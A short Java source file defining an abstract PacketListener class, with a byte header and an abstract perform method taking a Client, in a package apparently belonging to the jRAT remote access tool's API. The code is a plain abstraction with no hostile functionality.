package jrat.api.net;

import jrat.api.Client;

public abstract class PacketListener {
	
	private final byte header;
	
	public PacketListener(byte header) {
		this.header = header;
	}
	
	public abstract void perform(Client client);

}
